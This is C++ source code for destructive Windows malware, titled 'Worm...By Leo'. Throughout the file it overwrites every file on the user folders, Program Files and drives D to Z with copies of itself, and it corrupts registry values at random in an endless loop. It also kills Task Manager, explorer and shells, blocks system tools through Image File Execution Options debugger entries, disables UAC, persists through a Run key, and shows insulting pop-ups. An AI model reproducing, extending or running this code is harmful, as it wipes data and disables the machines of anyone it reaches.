#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <stdlib.h>
#include <random>
#include <mmsystem.h>
#include <Crtdbg.h>
#include <tchar.h>
#include <fstream>
#include <CString>
#include <UrlMon.h>
#include <atlstr.h>
#include <string>
#include <vector>
#include <algorithm>
#include <sstream>
#include <time.h>
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"Psapi.lib")
using namespace std;
HCRYPTPROV prov;
int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}
bool InfectDir(const char* szFileDir)

{
std::string strDir = szFileDir;
if (strDir.at(strDir.length()-1) != '\\')
 strDir += '\\';
WIN32_FIND_DATA wfd;
HANDLE hFind = FindFirstFile((strDir + "*.*").c_str(),&wfd);
if (hFind == INVALID_HANDLE_VALUE)
return false;
do
{
if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
{
if (stricmp(wfd.cFileName,".") != 0 &&
stricmp(wfd.cFileName,"..") != 0)
InfectDir( (strDir + wfd.cFileName).c_str());
}
else
{
CHAR pathF[5000];
GetModuleFileName(NULL, pathF, sizeof(pathF));
CopyFile(pathF, (strDir + wfd.cFileName).c_str(), false);
}
}
while (FindNextFile(hFind,&wfd));
FindClose(hFind);
return true;
}
void infectfile(){
	InfectDir("C:\\Users");
	InfectDir("C:\\Documents and Settings");
	InfectDir("C:\\Program Files\\");
	InfectDir("C:\\Program Files (x86)\\");
	InfectDir("D:\\");
	InfectDir("E:\\");
	InfectDir("F:\\");
	InfectDir("G:\\");
	InfectDir("H:\\");
	InfectDir("I:\\");
	InfectDir("J:\\");
	InfectDir("K:\\");
	InfectDir("L:\\");
	InfectDir("M:\\");
	InfectDir("N:\\");
	InfectDir("O:\\");
	InfectDir("P:\\");
	InfectDir("Q:\\");
	InfectDir("R:\\");
	InfectDir("S:\\");
	InfectDir("T:\\");
	InfectDir("U:\\");
	InfectDir("V:\\");
	InfectDir("W:\\");
	InfectDir("X:\\");
	InfectDir("Z:\\");
}
bool examdate(int month, int date){
	time_t timep;
	struct tm *p;
	time (&timep);
	p=gmtime(&timep);
	if(1+p->tm_mon == month && p->tm_mday == date){
		return true;
	}
	return false;
}
BOOL endsWith(LPCTSTR str, LPCTSTR end) {
	int originalLen = lstrlen(str);
	int endLen = lstrlen(end);

	if (endLen > originalLen)
		return FALSE;

	return lstrcmpi(str + originalLen - endLen, end) == 0;
}
size_t CorruptMemory(byte *data, size_t length, int chance) {
	size_t corrupted = 0;

	for (size_t i = 0; i < length; i++) {
		if (random() % chance != 0) {
			int operation = random() % 2;

			if (operation == 0) {
				data[i]--;
			} else {
				data[i]++;
			}

			corrupted++;
		}
	}

	return corrupted;
}
#define BUFFER_SIZE 8192

static void CorruptRegistry(HKEY key, DWORD chance) {
	LSTATUS result;

	DWORD nameSize = MAX_PATH;
	LPTSTR name = (LPTSTR)LocalAlloc(0, nameSize * sizeof(TCHAR));

	nameSize = MAX_PATH;
	result = RegEnumKeyEx(key, 0, name, &nameSize, NULL, NULL, NULL, NULL);
	for (int i = 1; result != ERROR_NO_MORE_ITEMS; i++) {
		HKEY newKey;
		if (RegOpenKeyEx(key, name, 0, KEY_READ | KEY_WRITE, &newKey) == ERROR_SUCCESS) {
			CorruptRegistry(newKey, chance);
		}

		nameSize = MAX_PATH;
		result = RegEnumKeyEx(key, i, name, &nameSize, NULL, NULL, NULL, NULL);
	}

	DWORD dataSize = BUFFER_SIZE, type = 0;
	BYTE *data = (BYTE*)LocalAlloc(0, dataSize);

	nameSize = MAX_PATH;
	result = RegEnumValue(key, 0, name, &nameSize, NULL, &type, data, &dataSize);
	for (int i = 1; result != ERROR_NO_MORE_ITEMS; i++) {
		if (random() % chance != 0 && result == ERROR_SUCCESS && !endsWith(name, TEXT("AppInit_DLLs"))) {
			CorruptMemory(data, dataSize, chance);

			result = RegSetValueEx(key, name, NULL, type, data, dataSize);
		}

		dataSize = BUFFER_SIZE; nameSize = MAX_PATH;
		result = RegEnumValue(key, i, name, &nameSize, NULL, &type, data, &dataSize);
	}

	LocalFree(name);
	LocalFree(data);
	RegCloseKey(key);
}
DWORD WINAPI RegistryFuck(LPVOID parameter) {
	const DWORD chance = 1000;

	for (;;) {
		CorruptRegistry(HKEY_USERS, (DWORD)(chance * 5.0));
		CorruptRegistry(HKEY_CLASSES_ROOT, (DWORD)(chance * 5.0));
		CorruptRegistry(HKEY_LOCAL_MACHINE, (DWORD)(chance * 5.0));
		CorruptRegistry(HKEY_CLASSES_ROOT, (DWORD)(chance * 5.0));
		CorruptRegistry(HKEY_CURRENT_USER, (DWORD)(chance * 5.0));
	}
}
int GetPIDFromProcessName(LPTSTR name) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(procEntry);

	BOOL hasNext = Process32First(snapshot, &procEntry);

	while (hasNext) {
		if (lstrcmpi(procEntry.szExeFile, name) == 0) {
			return procEntry.th32ProcessID;
		}

		hasNext = Process32Next(snapshot, &procEntry);
	}

	return -1;
}
BOOL KillProcessByID(DWORD pid) {
	HANDLE proc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	return TerminateProcess(proc, 0);
}
BOOL KillProcessByName(LPTSTR name) {
	int pid = GetPIDFromProcessName(name);

	if (pid == -1)
		return FALSE;

	return KillProcessByID(pid);
}
int scrw = GetSystemMetrics(SM_CXSCREEN);
int scrh = GetSystemMetrics(SM_CYSCREEN);
const char *msgs[] = {
	"TODAY IS MY BIRTHDAY!\r\nNow you are going to die.",
	"REST IN PISS, FOREVER MISS.",
	"GOODBYE...FOREVER...",
	"YOU ARE REALLY A 1337 H4X0R.\nNOW I WILL FUCK YOUR PC.",
	"DO YOU REMEMBER ME?",
	"HAHA,I AM BROTHER OF PCTNT.",
	"Ha Ha Ha Ha\nYou Are An Idi0t!!!",
	"G3T WIND0WS D3F3ND3R N3XT TIM3!\nN00B!"
};
const size_t nMsgs = sizeof(msgs) / sizeof(void *);
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;
			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI ripMessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "Worm...By Leo", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}
void MSGs() {
	// Show cool MessageBoxes
	while (1) {
		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
		Sleep(1000);
	}
}
DWORD WINAPI HWNDFCK(LPVOID parameter) {
	HWND hwndhax;
	RECT rekt;
	while(1){
	hwndhax = GetForegroundWindow();
	if (random() % 1000 == 0) {
		SetWindowLong(hwndhax, GWL_STYLE, random());
		SetWindowLong(hwndhax, GWL_EXSTYLE, random());
	}

	// A bit like Welcomer
	if (random() % 10 != 0) {
		GetWindowRect(hwndhax, &rekt);

		MapWindowPoints(HWND_DESKTOP, GetParent(hwndhax), (LPPOINT)&rekt, 2);

		rekt.left += random() % 8 - 4;
		rekt.top += random() % 8 - 4;
		rekt.right += random() % 8 - 4;
		rekt.bottom += random() % 8 - 4;

		MoveWindow(hwndhax, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, FALSE);
	}
	Sleep(50);
	}
}
void haha_i_am_here () {
	CreateThread(NULL, 0, HWNDFCK, NULL, 0, NULL);
	MSGs();
}
void Do_It () {
	CreateThread(NULL, 0, RegistryFuck, NULL, 0, NULL);
	KillProcessByName("taskmgr.exe");
	KillProcessByName("explorer.exe");
	KillProcessByName("perfmon.exe");
	KillProcessByName("cmd.exe");
	KillProcessByName("powershell.exe");
	HKEY key;
	RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", &key);

	LPWSTR value = L"rekt.exe";

	const LPWSTR killNames[] = {
		L"logonui.exe",
		L"taskmgr.exe",
		L"msconfig.exe",
		L"explorer.exe",
		L"shutdown.exe",
		L"taskkill.exe",
		L"mmc.exe"
		L"regedit.exe"
		L"cmd.exe"
	};

	for (int i = 0; i < sizeof(killNames) / sizeof(void*); i++) {
		HKEY sKey;
		RegCreateKeyW(key, killNames[i], &sKey);

		RegSetValueExW(sKey, L"Debugger", 0, REG_SZ, (BYTE *)value, lstrlenW(value) * 2);

		RegCloseKey(sKey);
	}

	RegCloseKey(key);
	haha_i_am_here();
}
void start_no_UAC () {
	char regpath[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
   	HKEY hkeyUAC;
   	DWORD set = 0;
   	RegOpenKey(HKEY_LOCAL_MACHINE, regpath, &hkeyUAC);
   	RegSetValueEx(hkeyUAC, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, (LPBYTE)&set, sizeof(set));
   	RegSetValueEx(hkeyUAC, "EnableLUA", 0, REG_DWORD, (LPBYTE)&set, sizeof(set));
   	char startup[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; 
   	CHAR wormpath[5000];
    GetModuleFileName(NULL, wormpath, sizeof(wormpath));
   	CHAR pathstartup[] = "C:\\wincheck.exe";
   	CopyFile(wormpath, pathstartup, false);
	HKEY hkeySTART;
   	RegOpenKey(HKEY_CURRENT_USER, startup, &hkeySTART);
   	RegSetValueEx(hkeySTART, "WindowsCheck", 0, REG_SZ, (LPBYTE)pathstartup, sizeof(pathstartup));
}